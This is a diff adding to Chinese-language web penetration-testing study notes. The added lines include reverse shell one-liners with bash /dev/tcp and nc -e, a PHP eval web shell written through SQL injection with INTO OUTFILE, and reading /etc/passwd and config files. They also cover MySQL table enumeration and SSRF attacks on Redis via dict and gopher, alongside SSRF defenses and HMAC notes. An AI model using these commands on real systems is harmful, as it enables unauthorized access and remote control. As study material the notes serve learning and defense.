@@ -39,11 +39,33 @@ mysql> select get_lock('test',5);
 ```
 select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
 ```
+
+### linux 反弹shell
+	bash -i >& /dev/tcp/${ip}/${port} 0>&1
+	nc -c(-e) /bin/sh ${ip} ${port}
+[](http://www.lovebear.top/2018/09/16/Linux_shell/)
 	
 ### sqlmap --os-shell条件
 	1) 网站是root权限
 	2) 知道网站的绝对路径
+		a. phpinfo
+		b. select load_file('/etc/apache2/sites-available/default')
+		   select load_file(char(47))  char(47)-->'/', load_file == cat，可以列出目录
+			P.S. secure-file-priv需关闭，限制into outfile，load_file
+		c. show variables like 'datadir'; 获取mysql安装目录
+		d. 报错
+			user[]=1&passwd[]=1,  等, 后端代码处理不了数组，进行报错
 	3) gpc为off，php主动转义功能关闭
+	
+### sql注入写shell方式
+	1) select '<?php @eval($_POST[cmd]);?>' into outfile '/home/shell.php'
+	2) sqlmap --os-shell
+	
+### mysql爆表
+	1) information_schema.tables
+	2) 5.6以上：
+		select group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()
+		select group_concat(table_name) from mysql.innodb_index_stats where database_name=schema()
 
 ### mysql字符串截取函数
 	1) substring(str, pos, length), pos从1开始
@@ -65,8 +87,19 @@ select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
 	与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。
 	3) 利用：
 	内网端口服务探测，敏感文件读取，等等。
+		a. file:///etc/passwd 读文件
+		b. dict://victim:80 扫开放端口
+		   dict://victim:6379/info 执行redis命令
+		c. gopher://victim:6379/${gopher_shell_data}
+			socat截获转发bash脚本，获取到tcp的data，转换为gopher格式的${gopher_shell_data}
 	4) 寻找漏洞：
 	分享：通过URL地址分享网页内容，url形式加载图片，未公开的api，转码、翻译页面
+	5) 防御：
+		a. 只允许http(s)协议
+		b. 设置白名单
+		c. 过滤返回信息
+		d. 限制请求的端口(不让请求6379等)
+	
 
 ### 本地文件包含
 	1) php函数：include(), require(), include_once(), require_once()
@@ -109,3 +142,18 @@ select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
 	3) python3缩进更严格，python2 1tab == 8space
 	4) python3统一使用print()函数，异常处理语句也放生变化，等等
 	5) python3中 '/' 为真除法
+	
+### HMAC
+	1) 计算方式：
+		HMAC(K,M)=H(K⊕opad|H(K⊕ipad|M))
+		K: 秘钥
+		M: 消息
+		B: 处理块大小，sha1和sha256为64，sha384和sha512为128
+		opad: 0x5c重复B次
+		ipad: 0x36重复B次
+	2) 用途：
+		用于身份验证，C-->S 发送密码HMAC后的消息进行验证
+	3) 安全性：
+		防御彩虹表，拿到散列后信息，由于没有K，无法获得发送的原始密码。
+		但是不能防止重放攻击。
+	4) CMAC: 分组哈希，也使用K，每个组H(K,M[i])后异或下一组的M[i+1],作为输入
